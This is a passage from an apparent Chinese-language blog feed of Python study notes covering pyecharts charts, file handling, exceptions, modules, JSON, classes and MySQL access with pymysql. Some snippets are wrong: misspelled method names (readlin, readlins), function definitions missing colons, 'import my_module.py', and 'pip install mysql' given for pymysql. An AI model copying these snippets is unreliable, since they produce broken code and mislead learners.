&quot;#990033&quot;&#125;        ]    ))</code></pre><h3 id="3-2-2-系列配置项"><a href="#3-2-2-系列配置项" class="headerlink" title="3.2.2 系列配置项"></a>3.2.2 系列配置项</h3><h1 id="四、构建柱状图"><a href="#四、构建柱状图" class="headerlink" title="四、构建柱状图"></a>四、构建柱状图</h1><h2 id="4-1、创建柱状图"><a href="#4-1、创建柱状图" class="headerlink" title="4.1、创建柱状图"></a>4.1、创建柱状图</h2><pre><code class="python">#构建基本柱状图#导包from pyecharts.charts import Bar#创建一个对象bar = Bar()#添加x轴数据bar.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;英国&quot;])#添加y轴数据bar.add_yaxis(&quot;GDP&quot;,[30,20,10])#绘图bar.render(&quot;柱状图.html&quot;)</code></pre><h2 id="4-2、配置项"><a href="#4-2、配置项" class="headerlink" title="4.2、配置项"></a>4.2、配置项</h2><h3 id="4-2-1、全局配置项"><a href="#4-2-1、全局配置项" class="headerlink" title="4.2.1、全局配置项"></a>4.2.1、全局配置项</h3><h3 id="4-2-2、系列配置项"><a href="#4-2-2、系列配置项" class="headerlink" title="4.2.2、系列配置项"></a>4.2.2、系列配置项</h3><p>图表反转</p><pre><code class="python">#构建基本柱状图#导包from pyecharts.charts import Bar#创建一个对象bar = Bar()#添加x轴数据bar.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;英国&quot;])#添加y轴数据bar.add_yaxis(&quot;GDP&quot;,[30,20,10])#反转x和y轴bar.reversal_axis()#绘图bar.render(&quot;柱状图.html&quot;)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、pyecharts模块&quot;&gt;&lt;a href=&quot;#一、pyecharts模块&quot; class=&quot;headerlink&quot; title=&quot;一、pyecharts模块&quot;&gt;&lt;/a&gt;一、pyecharts模块&lt;/h1&gt;&lt;p&gt;pyecharts模块可以</summary>
      
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="开发" scheme="http://www.tanglx.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="数据可视化" scheme="http://www.tanglx.cn/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python常用模块使用</title>
    <link href="http://www.tanglx.cn/2024/06/07/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.tanglx.cn/2024/06/07/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</id>
    <published>2024-06-07T08:56:30.000Z</published>
    <updated>2024-06-10T08:20:45.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、sys-解释器交互"><a href="#1、sys-解释器交互" class="headerlink" title="1、sys(解释器交互)"></a>1、sys(解释器交互)</h3><p><strong>终止程序</strong><br><code>sys.exit()</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1、sys-解释器交互&quot;&gt;&lt;a href=&quot;#1、sys-解释器交互&quot; class=&quot;headerlink&quot; title=&quot;1、sys(解释器交互)&quot;&gt;&lt;/a&gt;1、sys(解释器交互)&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;终止程序&lt;/strong&gt;&lt;br&gt;&lt;code&gt;s</summary>
      
    
    
    
    <category term="开发" scheme="http://www.tanglx.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="python" scheme="http://www.tanglx.cn/tags/python/"/>
    
    <category term="开发" scheme="http://www.tanglx.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="模块" scheme="http://www.tanglx.cn/tags/%E6%A8%A1%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>Python基础语法-2</title>
    <link href="http://www.tanglx.cn/2024/06/05/%E5%BC%80%E5%8F%91/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-2/"/>
    <id>http://www.tanglx.cn/2024/06/05/%E5%BC%80%E5%8F%91/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-2/</id>
    <published>2024-06-05T03:29:41.000Z</published>
    <updated>2024-07-01T09:29:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="基础语法-2"><a href="#基础语法-2" class="headerlink" title="基础语法-2"></a>基础语法-2</h1><h2 id="一、文件"><a href="#一、文件" class="headerlink" title="一、文件"></a>一、文件</h2><h3 id="1-1、文件的编码"><a href="#1-1、文件的编码" class="headerlink" title="1.1、文件的编码"></a>1.1、文件的编码</h3><p>编码就是一种转换的规则集合，记录了内容和二进制间进行相互转换的逻辑。<br>编码有许多中，最常用的是<code>UTF-8</code>编码</p><p>计算机只识别0和1，需要将内容通过编码转换为0和1才能在计算机中保存，或者0和1需要通过编码转换为内容。</p><pre><code class="sml">内容-&gt;编码-&gt;二进制二进制-&gt;编码-&gt;内容</code></pre><h3 id="1-2、文件的打开和关闭"><a href="#1-2、文件的打开和关闭" class="headerlink" title="1.2、文件的打开和关闭"></a>1.2、文件的打开和关闭</h3><h4 id="1-2-1、打开文件"><a href="#1-2-1、打开文件" class="headerlink" title="1.2.1、打开文件"></a>1.2.1、打开文件</h4><p>语法1：<code>文件对象=open(name,mode,encoding)</code><br>示例1：<code>f=open(&quot;D:/测试.txt&quot;,&quot;r&quot;,encoding=&quot;UTF-8&quot;)</code><br>这种打开方式如果程序没有停止，不会自动释放文件</p><p>语法2：<code>with open(name,mode,encoding) as 文件对象</code><br>通过with open() as 文件对象, 这种方式打开的文件，读取完会自动释放文件</p><blockquote><p>name:是要打开的目标文件名字符串(可以包含文件所在的具体路径)。<br>mode:设置打开文件的模式(访问模式):只读，写入、追加等。<br>encoding:编码格式(推荐使用UTF-8)</p></blockquote><p>mode常用的三种基础访问模式：</p><blockquote><p>r：以只读方式打开文件，文件的指针将会放在文件的开头。这是默认模式<br>w：打开一个文件只用于写入。如果该文件已存在则打开文件，并从头开始编辑，原有内容会被删除；如果该文件不存在，创建新文件。<br>a：打开一个文件用于追加，如果文件已存在，新的内容会被写入到已有内容之后；如果该文件不存在，创建新文件进行写入</p></blockquote><h4 id="1-2-2、关闭文件"><a href="#1-2-2、关闭文件" class="headerlink" title="1.2.2、关闭文件"></a>1.2.2、关闭文件</h4><ul><li>关闭文件对象，也就是关闭对文件的占用</li><li>如果不调用close,同时程序没有停止运行，那么这个文件将一直被Python程序占用</li><li>close()方法里面内置了flush()<br>语法：<code>close()</code><br>示例:</li></ul><pre><code class="python">f=open(&quot;D:/测试.txt&quot;,&quot;r&quot;,encoding=&quot;UTF-8&quot;)f.close()</code></pre><h3 id="1-3、文件的读取"><a href="#1-3、文件的读取" class="headerlink" title="1.3、文件的读取"></a>1.3、文件的读取</h3><p><strong>读取指定长度字节</strong><br>语法：<code>文件对象.read(num)</code><br>注意：不写字节(num)则读取全部内容</p><p><strong>读取一行</strong><br>语法：<code>文件对象.readlin()</code></p><p><strong>读取全部行，得到列表</strong><br>语法：<code>文件对象.readlins()</code><br>注意：读取全部行，得到列表，每一行为一个元素</p><p><strong>for循环文件行</strong><br>语法：<code>for line in 文件对象</code><br>注意：一次循环得到一行数据</p><h3 id="1-4、文件的写入"><a href="#1-4、文件的写入" class="headerlink" title="1.4、文件的写入"></a>1.4、文件的写入</h3><p>语法：<code>文件对象.write(内容)</code><br>示例：</p><pre><code class="python"># 1.打开文件f=open(&quot;python.txt&quot;,&#39;w&#39;,encoding=&quot;UTF-8&quot;)# 2.写入缓冲区f.write(&quot;helloword&quot;)# 3.写入到文件f.flush()</code></pre><p>注意事项：</p><ul><li>直接调用write，内容并未真正写入文件，而是会积累在程序的内存中，称之为缓冲区</li><li>当调用flush的时候，内容会真正写入文件</li><li>这样做是避免频繁的操作硬盘，导致效率下降(攒一堆，一次写入磁盘)</li><li>close()方法内置了flush功能</li></ul><h3 id="1-5、文件的追加"><a href="#1-5、文件的追加" class="headerlink" title="1.5、文件的追加"></a>1.5、文件的追加</h3><p>语法：<code>文件对象.write(内容)</code><br>示例：</p><pre><code class="python"># 1.打开文件f=open(&quot;python.txt&quot;,&#39;a&#39;,encoding=&quot;UTF-8&quot;)# 2.写入缓冲区f.write(&quot;helloword&quot;)# 3.写入到文件f.flush()</code></pre><p>注意事项：</p><ul><li>a模式，文件不存在会创建文件</li><li>a模式，文件存在会在最后，追加写入文件</li></ul><h2 id="二、异常"><a href="#二、异常" class="headerlink" title="二、异常"></a>二、异常</h2><p>当检测到<code>一个错误</code>时，Python解释器就无法继续执行了，反而出现了一些错误提示，这就是所谓的<code>异常</code>，也就是我们常说的<code>BUG</code></p><h3 id="2-1、异常的捕获方法"><a href="#2-1、异常的捕获方法" class="headerlink" title="2.1、异常的捕获方法"></a>2.1、异常的捕获方法</h3><p>捕获异常的作用在于：在可能发生异常的地方，进行捕获，当异常出现的时候，提供解决方法，而不是任由其导致程序无法运行。</p><p>普通语法：</p><pre><code class="python">try:    可能发生错误的代码except:    如果出现异常执行的代码</code></pre><p>指定类型捕获：</p><pre><code class="python">try:    可能发生错误的代码except(异常类型1,异常类型2):    如果出现指定异常执行的代码</code></pre><p>捕获所有异常：</p><pre><code class="python">try:    可能发生错误的代码except Exception as e:#as a 会把异常信息给变量a    不论出现什么异常都执行的代码</code></pre><p>异常else和异常finally：</p><pre><code class="python">try:    可能发生错误的代码except Exception as e:#as a 会把异常信息给变量a    不论出现什么异常都执行的代码else:    没有异常执行的代码finally:    无论是否异常都执行</code></pre><h2 id="三、模块和Python包"><a href="#三、模块和Python包" class="headerlink" title="三、模块和Python包"></a>三、模块和Python包</h2><p>模块是一个<code>python文件</code>，以<code>.py结尾</code>，模块能定义函数，类和变量，模块里也能包含可执行代码</p><p> pycharm快捷键：<code>ctrl加左键</code>点击模块名，就能查看.py文件<br>  pycharm快捷键：<code>ctrl加p键</code>点击模块名，就能查看传入参数的提示</p><h3 id="3-1、模块的导入"><a href="#3-1、模块的导入" class="headerlink" title="3.1、模块的导入"></a>3.1、模块的导入</h3><p>模块在使用前需要先导入<br>导入语法:</p><pre><code class="python">[from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]</code></pre><p>常见的组合形式如：</p><pre><code class="python">import 模块名from 模块名 import 类、变量、方法等(功能)from 模块名 import *import 模块名 as 别名from 模块名 import 功能名 as 别名</code></pre><ul><li>import 引入模块所有功能,用<code>模块.功能</code>调用</li><li>from 模块 import 功能 单独获取一个功能,直接使用<code>功能</code></li><li>from可以省略，直接import即可</li><li>as别名可以省略</li><li>通过”.”来确定层级关系</li><li>模块的导入一般写在代码文件的开头</li></ul><h3 id="3-2、自定义模块并导入"><a href="#3-2、自定义模块并导入" class="headerlink" title="3.2、自定义模块并导入"></a>3.2、自定义模块并导入</h3><p>定义一个.py文件作为模块，函数作为内容<br>示例：</p><pre><code class="python"># 新建一个Python文件，命名未my_modulel.py 并定义test函数# my_modulel.pydef test(a,b)    print(a+b)# 调用自定义模块# test_my_module.pyimport my_module.pymy_module.test(10,20)</code></pre><p><strong>自定义模块中的测试(main)：</strong><br>当自定义一个模块的时候，模块里面可能需要写一些除了函数以外的测试代码，<code>测试模块</code>就是为了避免调用模块时执行这些测试代码</p><p>语法:</p><pre><code class="python"># my_modulel.py(自定义模块)def test(a,b)    print(a+b)if __name__ == &#39;__main__&#39;: #(在pycharm中只需要输入main，就会自动补全)    测试语句</code></pre><p><strong>自定义模块中的限制导入(all)</strong><br>自定义模块中如果有多个函数，improt*会把这些函数全导入过去，<code>__all__</code>就是为了做限制导入的函数<br>语法:</p><pre><code class="python"># my_modulel.py(自定义模块)__all__ = [&#39;test&#39;]#限制只能improt*只能导入test函数def test(a,b)    print(a+b)    def test_b(a,b)    print(a+b)</code></pre><h2 id="注意事项-不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的"><a href="#注意事项-不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的" class="headerlink" title="注意事项:- 不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的"></a><strong>注意事项:</strong><br>- 不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的</h2><h3 id="3-3、自定义Python包"><a href="#3-3、自定义Python包" class="headerlink" title="3.3、自定义Python包"></a>3.3、自定义Python包</h3><p>模块是一个.py文件，<code>python包</code>其实就是一个<code>文件夹</code>,在该文件夹下包含了一个<code>__init__.py</code> 文件，该文件夹可用于包含多个<code>模块文件</code>，从逻辑上看，包的本质依然是<code>模块</code></p><h4 id="3-3-1、定义Python包"><a href="#3-3-1、定义Python包" class="headerlink" title="3.3.1、定义Python包"></a>3.3.1、定义Python包</h4><ul><li>1.创建一个文件夹，文件夹内包含一个<code>__init__.py</code> 文件，那么这文件夹就是包(pycharm可以右键创建包)</li><li>2.在这个文件夹中，写入模块</li></ul><h4 id="3-3-2、导入Python包"><a href="#3-3-2、导入Python包" class="headerlink" title="3.3.2、导入Python包"></a>3.3.2、导入Python包</h4><p>语法1:<code>from 包名 import 模块名</code><br>语法2:<code>import 包名.模块名</code></p><h3 id="3-4、安装第三方包"><a href="#3-4、安装第三方包" class="headerlink" title="3.4、安装第三方包"></a>3.4、安装第三方包</h3><p>在python程序生态中，有许多非常多的第三方包(非Python官方)，可以极大帮助我们提高开发效率，如：</p><ul><li>科学计算中常用的: numpy包</li><li>数据分析中常用的：pandas包</li><li>大数据计算中常用的：pyspark、apache-flink包</li><li>图像可视化常用的：matplotlib、pyecharts包</li><li>人工智能常用的：tensorflow包</li><li>等</li></ul><p><strong>安装第三方包-pip</strong></p><ul><li>使用Python内置pip在命令提示符中输入，语法:<code>pip install 包名称</code></li><li>使用国内网络下载：<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 包名称</code></li><li>pycharm中安装</li></ul><h2 id="四、json数据格式"><a href="#四、json数据格式" class="headerlink" title="四、json数据格式"></a>四、json数据格式</h2><ul><li>json是一种轻量级的数据交互格式，可以按照json指定的格式去组织和封装数据</li><li>json本质上是一个带有特定格式的<code>字符串</code></li></ul><p>主要功能：json就是一种在各个变成语言中通用的数据格式，负责不同编程语言中的数据传递和交互，类似于：</p><ul><li><p>国际通用语言-英语</p><p><strong>json格式的格式:</strong></p></li></ul><pre><code class="json">#json数据的格式可以是：&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125; #也可以是：[&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125;,&#123;&quot;name&quot;:&quot;root&quot;,&quot;age&quot;:16&#125;,&#123;&quot;name&quot;:&quot;alis&quot;,&quot;age&quot;:20&#125;]</code></pre><p>在线json网站(<a href="https://www.sojson.com/">sojson.com</a>)</p><h3 id="4-1、json格式数据转换"><a href="#4-1、json格式数据转换" class="headerlink" title="4.1、json格式数据转换"></a>4.1、json格式数据转换</h3><p><strong>Python数据和json数据的相互转换：</strong></p><pre><code class="python">#导入json模块import json# 准备符合格式json格式要求的python数据data=[&#123;&quot;name&quot;:&quot;admin&quot;,&quot;age&quot;:18&#125;,&#123;&quot;name&quot;:&quot;root&quot;,&quot;age&quot;:16&#125;]#通过json.dumps(data)方法把python数据转换为json数据data=json.dumps(data,ensure_ascii=False)#没有中文可以不带ensure_ascii=False#通过json.loads(data)方法把json数据转换为python数据data=json.loads(data)</code></pre><h2 id="五、面向对象"><a href="#五、面向对象" class="headerlink" title="五、面向对象"></a>五、面向对象</h2><p>面向对象编程，是许多编程语言都支持的一种编程思想。<br>简单理解是：基于模板(类)去创建实体(对象),使用对象完成功能开发。<br>面向对象的三大特性：</p><ul><li>封装</li><li>继承</li><li>多态</li></ul><h3 id="5-1、类和对象"><a href="#5-1、类和对象" class="headerlink" title="5.1、类和对象"></a>5.1、类和对象</h3><h4 id="5-1-1、类"><a href="#5-1-1、类" class="headerlink" title="5.1.1、类"></a>5.1.1、类</h4><ul><li>类相当于一个定义好模板的表格，用指定的模板来存储数据</li><li>类有两部分组成(成员变量,成员方法)<br>类的定义语法：</li></ul><pre><code class="python">class 类名称:    #类中的成员变量(属性)    name = None    age = None        #类中的成员方法(行为)    def say_hi(self)        print(f&quot;Hi,我是&#123;self.name&#125;&quot;)#输出:Hi,我是name</code></pre><p>如果将<code>类</code>带入到现实世界无非就是分为<code>事和物</code>，事和物又细分为<code>属性和行为</code></p><h4 id="5-1-2、类对象"><a href="#5-1-2、类对象" class="headerlink" title="5.1.2、类对象"></a>5.1.2、类对象</h4><p>类只是一种程序内的”设计图纸”，需要基于图纸生产(对象)，才能正常工作<code>(面向对象编程)</code></p><p>类对象的定义语法:</p><pre><code class="python">对象=类名称()</code></pre><h3 id="5-2、类的方法"><a href="#5-2、类的方法" class="headerlink" title="5.2、类的方法"></a>5.2、类的方法</h3><p>定义到类中的函数就叫方法</p><h4 id="5-2-1、成员方法"><a href="#5-2-1、成员方法" class="headerlink" title="5.2.1、成员方法"></a>5.2.1、成员方法</h4><p>成员方法的定义语法：</p><pre><code class="python">#在类中定义方法和定义函数基本一致，但仍有细微区别:def 方法名(self,形参1,,,,形参n):    方法体</code></pre><p>和函数区别多了一个self关键字,定义方法时候,<code>必须填写</code>的</p><ul><li>self表示类对象自身的意思</li><li>当使用类对象调用方法时，self会自动被python传入</li><li>在方法内部，想要访问类的成员变量，必须使用self(<code>self.成员变量</code>)</li></ul><p>成员方法调用：</p><pre><code class="python">user1=Student()#创建类对象user1.方法名(形参1,,,,形参n)#使用成员方法</code></pre><h4 id="5-5-2、魔术方法"><a href="#5-5-2、魔术方法" class="headerlink" title="5.5.2、魔术方法"></a>5.5.2、魔术方法</h4><h5 id="a、构造方法-init"><a href="#a、构造方法-init" class="headerlink" title="a、构造方法(init)"></a>a、构造方法(<strong>init</strong>)</h5><p>使用<code>__init__</code>方法，称之为构造方法。</p><ul><li>在创建类对象(构造类)的时候,<code>会自动执行</code>。</li><li>在创建类对象(构造类)的时候，<code>将自动传递给__init__方法使用</code></li></ul><p>构造方法的定义语法：</p><pre><code class="python">class Student:    age=None    name=None    tel=None    def __init__(self,name,age,tel):#构造方法定义        self.name = name#接收成员变量        self.age = age#接收成员变量        self.tel = tel#接收成员变量        print(&quot;自动执行&quot;)</code></pre><p>构造方法调用：</p><pre><code class="python">user1=Student(&quot;leo&quot;,&quot;18&quot;,&quot;123456789&quot;)#创建对象时直接传入成员变量，同时构造方法也会自动执行</code></pre><h5 id="b、字符串方法-str"><a href="#b、字符串方法-str" class="headerlink" title="b、字符串方法(str)"></a>b、字符串方法(<strong>str</strong>)</h5><p>使用<code>__str__</code>方法，称之为字符串方法。</p><ul><li>实现类对象转字符串的行为</li><li>可以str方法用在定制一个返回值给类对象</li></ul><pre><code class="python">class Student:    def __init__(self,name,age):#构造方法        self.name=name        self.age=age    def __str__(self):        return (f&quot;name:&#123;self.name&#125;,age&#123;self.age&#125;&quot;)#字符串方法，返回值给类对象user1 = Student(&quot;leo&quot;,&quot;18&quot;)#创建类对象，并赋值，同时将返回值给了user1print(user1)#输出name:leo,age18</code></pre><h3 id="5-3、封装"><a href="#5-3、封装" class="headerlink" title="5.3、封装"></a>5.3、封装</h3><blockquote><p>可以把封装描述为一种思想，将现实事物映射为程序思想</p></blockquote><p>封装表示的是，将现实世界事物的：</p><ul><li>属性</li><li>行为</li></ul><p>封装到类中，描述为：</p><ul><li>成员变量</li><li>成员方法</li></ul><h4 id="5-3-1、私有成员"><a href="#5-3-1、私有成员" class="headerlink" title="5.3.1、私有成员"></a>5.3.1、私有成员</h4><p>既然现实事物有不公开的属性和行为，那么作为现实事物在程序中映射的类，也应该支持<br>类中提供了两种私有成员：</p><ul><li>私有成员变量</li><li>私有成员方法</li></ul><p><code>私有成员不能被对象调用,但是类中其它成员可以访问</code></p><p>定义语法：<code>__变量名</code>和<code>__方法名</code>(两个下划线开头)<br>示例：</p><pre><code class="python">class Phone:    IMEI=None#序列号    producer=None#厂商        __current_voltage=None#当前电压(私有成员变量)        def __keep_single_core(self):#私有成员        print(&quot;让cpu以单核模式运行以节省电量&quot;)    </code></pre><blockquote><p>私有成员的意义：<br>在类中提供仅内部使用的属性和方法，而不对外开放(类对象无法使用)</p></blockquote><h3 id="5-4、继承"><a href="#5-4、继承" class="headerlink" title="5.4、继承"></a>5.4、继承</h3><p>继承就是一个类，继承另外一个类的成员变量和成员方法</p><h4 id="5-4-1、单继承和多继承："><a href="#5-4-1、单继承和多继承：" class="headerlink" title="5.4.1、单继承和多继承："></a>5.4.1、单继承和多继承：</h4><p><strong>单继承:</strong><br>继承一个父类的全部内容</p><pre><code class="python">class 类名(父类名):    新增类内容</code></pre><p><strong>多继承：</strong><br>继承多个父类的全部内容</p><pre><code class="python">class 类名(父类1,父类2...,父类n):    psss#表示留空不增加内容</code></pre><p>多继承注意事项：<br>如果父类中有同名成员方法和成员属性，先继承优先级高于后继承</p><h4 id="5-4-2、复写和调用父成员："><a href="#5-4-2、复写和调用父成员：" class="headerlink" title="5.4.2、复写和调用父成员："></a>5.4.2、复写和调用父成员：</h4><p><strong>复写：</strong><br>子类继承父类的成员属性和成员方法后，如对其”不满意“，可以进行复写。<br>语法即：<code>在子类中重新定义同名的属性或方法即可。</code></p><p><strong>调用:</strong><br>在子类中调用父类成员<br>方式一：</p><blockquote><p>调用父类成员<br>调用成员变量：父类名.成员变量<br>调用成员方法：父类名.成员方法(self)</p></blockquote><p>方式二：</p><blockquote><p>使用super()调用父类成员<br>调用成员变量：super().成员变量<br>调用成员方法：super.成员方法()</p></blockquote><p>注意事项：只可以在子类内部调用同名的同类成员,子类的实体类调用默认是调用子类复写的</p><h3 id="5-5、多态"><a href="#5-5、多态" class="headerlink" title="5.5、多态"></a>5.5、多态</h3><p>多态，指的是：多种状态，即完成某个行为时，使用不同对象会得到不同的状态</p><h3 id="5-6、类型注解"><a href="#5-6、类型注解" class="headerlink" title="5.6、类型注解"></a>5.6、类型注解</h3><p>在代码中涉及数据交互的地方，提供类型的注解(显示的说明)。<br>主要功能：</p><ul><li>帮助第三方IDE对代码进行类型推断，协助做代码提示</li><li>帮助开发者自身对变量进行类型注释</li></ul><p>支持：</p><ul><li>变量的类型注解</li><li>函数(方法)形参列表和返回值的类型注解</li></ul><h4 id="5-6-1、变量的类型注解"><a href="#5-6-1、变量的类型注解" class="headerlink" title="5.6.1、变量的类型注解"></a>5.6.1、变量的类型注解</h4><p>基础语法：<code>变量:类型</code></p><h4 id="5-6-2、函数-方法-的类型注解"><a href="#5-6-2、函数-方法-的类型注解" class="headerlink" title="5.6.2、函数(方法)的类型注解"></a>5.6.2、函数(方法)的类型注解</h4><pre><code class="Python">def 函数方法名(形参:类型,,,形参:类型)-&gt;返回值类型:    pass</code></pre><h4 id="5-6-3、Union类型"><a href="#5-6-3、Union类型" class="headerlink" title="5.6.3、Union类型"></a>5.6.3、Union类型</h4><p>Union可以定义联合类型注释</p><pre><code class="python">from typing import UnionUnion[类型,...类型]</code></pre><h2 id="六、数据库-SQL"><a href="#六、数据库-SQL" class="headerlink" title="六、数据库(SQL)"></a>六、数据库(SQL)</h2><h3 id="6-1、mysql的基本使用"><a href="#6-1、mysql的基本使用" class="headerlink" title="6.1、mysql的基本使用"></a>6.1、mysql的基本使用</h3><p>Windows版mysql的安装：<a href="https://downloads.mysql.com/archives/installer/">下载链接</a><br>图形化sql操作软件(DBeaver)：<a href="https://dbeaver.io/download">下载链接</a></p><p><strong>SQL语言的分类</strong><br>由于数据库管理系统(数据库软件)功能非常多，不仅仅是存储数据,还要包含：数据的管理、表的管理、库的管理、账户的管理、权限管理等。<br>所以，操作数据库的SQL语言，也基于功能，可以分为四类:</p><ul><li>1.数据定义：DDL(Data Definition Language)<ul><li>库的创建删除、表的创建删除</li></ul></li><li>2.数据操作：DML(DataManipulation Language)<ul><li>新增数据、删除数据、修改数据等</li></ul></li><li>3.数据控制：DCL(Data Control Language)<ul><li>新增用户、删除用户、密码修改、权限管理等</li></ul></li><li>4.数据查询：DQL(Data Query Language)<ul><li>基于需求查询和计算数据</li></ul></li></ul><p><strong>SQL的语法特征</strong></p><ul><li>SQL语法，大小写不敏感</li><li>SQL可以单行或多行书写，最后以<code>;</code>号结束</li><li>SQL支持注释：<ul><li>单行注释：– 注释内容(– 后面要有空格)</li><li>单行注释：# 注释内容(# 后面可以不加空格，推荐加上)</li><li>多行注释：&#x2F;* 注释内容 *&#x2F;</li></ul></li></ul><p>命令行环境基础操作</p><pre><code class="sql">#登录mysql -uroot -p#查看有哪些数据库show databases;#使用某个数据库use 数据库名#查看数据内有哪些表show tables #退出mysql命令行环境exit</code></pre><h4 id="6-1-1、DDL-库、表操作"><a href="#6-1-1、DDL-库、表操作" class="headerlink" title="6.1.1、DDL(库、表操作)"></a>6.1.1、DDL(库、表操作)</h4><p><strong>库操作</strong><br>查看有哪些数据库<br><code>show databases;</code><br>使用数据库<br><code>use 数据库名称</code><br>创建数据库<br><code>create database 数据库名称 charset utf8;</code><br>删除数据库<br><code>drop database 数据库名称;</code><br>查看当前是使用的数据库<br><code>select database();</code></p><p><strong>表操作</strong><br>查看有哪些表（需要先选择数据库）<br><code>show tables;</code><br>删除表<br><code>drop table 表名称;</code><br><code>drop table if exists 表名称;</code><br>创建表</p><pre><code class="sql">create table 表名称(    列名称 列类型,    列名称 列类型):/*列类型有int-- 整数float-- 浮点型varchar(长度)   --文本，长度为数字，做最大长度限制date-- 日期类型timestamp-- 时间戳类型*/</code></pre><h4 id="6-1-2、DML-数据操作"><a href="#6-1-2、DML-数据操作" class="headerlink" title="6.1.2、DML(数据操作)"></a>6.1.2、DML(数据操作)</h4><p>DML是指数据操作语言，英文全程是Data Manipulation Language ，用来对数据库表中记录进行更新。插入<code>insert</code>   删除<code>delete</code>   更新<code>update</code></p><p><strong>数据插入 insert</strong><br>基础语法：<code>insert into 表[(列1,列2,....列n)] values(值1,值2,....值n),(值1,值2,....值n)...,(值1,值2,....值n)</code><br>示例:</p><pre><code class="sql"># 创建表create table test_table(    ID int,    name varchar(20),    age int);# 仅插入id列数据insert into test_table(ID) values(10001),(10002),(10003);# 插入全部列数据insert into test_table(ID,name,age) values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);# 插入全部列数据，快捷写法insert into test_table values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);</code></pre><p><strong>数据删除 delete</strong><br>删除行<br>基础语法 ：<code>delete from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 删除name为王五的数据delete from test_table where name=&quot;王五&quot;# 删除ID&gt;=10005的数据delete from test_table where ID&gt;=10005</code></pre><p><strong>数据更新 update</strong><br>基础语法：<code>update 表 set 列=值 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 修改age列的全部数据为30update test_table set age=30# 修改ID为10004的name为李四update test_table set name=&quot;李四&quot; where ID=10004</code></pre><h4 id="6-1-3、DQL-数据查询"><a href="#6-1-3、DQL-数据查询" class="headerlink" title="6.1.3、DQL(数据查询)"></a>6.1.3、DQL(数据查询)</h4><p><strong>基础查询</strong><br>基础语法：<code>select 列 from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 查询全部数据select * from test_table; # 查询id，name列中age=25的数据select ID,name from test_table where age=25;</code></pre><p><strong>排序分页</strong><br>排序基础语法：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc];</code><br>(order by 列，以这里的列为排序对象，asc为升序，desc为降序)<br>分页基础语法：<code>select 列 from 表 [where 条件判断] limit 显示数量;</code><br>排序分页嵌套：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc] limit 显示数量;</code></p><h3 id="6-2、pymysql模块"><a href="#6-2、pymysql模块" class="headerlink" title="6.2、pymysql模块"></a>6.2、pymysql模块</h3><p>在python中，使用第三方库：<code>pymysql</code>来完成对mysql数据库的操作<br>安装：<code>pip install mysql</code></p><h4 id="6-2-1、创建mysql数据库连接"><a href="#6-2-1、创建mysql数据库连接" class="headerlink" title="6.2.1、创建mysql数据库连接"></a>6.2.1、创建mysql数据库连接</h4><ul><li>创建连接对象&#x3D;Connection(数据库信息)</li></ul><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;   #密码)# 打印mysql数据库软件信息print(conn.get_server_info())#关闭数据库连接conn.close()</code></pre><h4 id="6-2-2、执行sql语句-查询"><a href="#6-2-2、执行sql语句-查询" class="headerlink" title="6.2.2、执行sql语句-查询"></a>6.2.2、执行sql语句-查询</h4><ul><li>创建游标&#x3D;连接对象.cursor() #创建游标对象,使用游标操作数据库，</li><li>游标对象.execute(“执行语句”)#使用游标对象执行数据库</li><li>游标对象.fetchall() #接收数据以元组的形式显示</li></ul><pre><code class="python"># 创建mysql数据库连接from pymysql import Connection  #导包# 获取到mysql数据库的连接对象conn = Connection(    host=&#39;localhost&#39;,   #主机名(或ip)    port=3306,          #端口    user=&#39;root&#39;,        #账户名    password=&#39;123456&#39;   #密码)cursor = conn.cursor()# 创建游标对象conn.select_db(&quot;test&quot;)#选择数据库cursor.execute(&quot;select * from test_table;&quot;)#使用游标对象执行sql查询语句results=cursor.fetchall()   #使用游标接收显示数据print(results)#打印数据conn.close()#关闭数据库连接</code></pre><h4 id="6-2-3、执行sql语句-插入"><a href="#6-2-3、执行sql语句-插入" class="headerlink" 